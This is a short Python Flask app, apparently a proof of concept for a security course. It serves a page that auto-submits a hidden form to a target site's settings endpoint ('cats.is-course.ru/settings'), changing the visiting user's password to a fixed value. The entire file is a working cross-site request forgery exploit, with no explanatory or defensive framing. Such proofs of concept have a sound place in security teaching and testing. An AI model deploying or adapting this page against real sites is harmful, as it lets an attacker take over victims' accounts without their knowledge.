from flask import Flask

app = Flask(__name__)

@app.route("/")
def hello_world():
    return """
        <form action="https://cats.is-course.ru/settings" method="POST">
            <input name="password" value="345">
            <input name="confirm-password" value="345">
        </form>
        <script>
            document.forms[0].submit()
        </script>
    """

if __name__ == "__main__":
    app.run("0.0.0.0", 8080)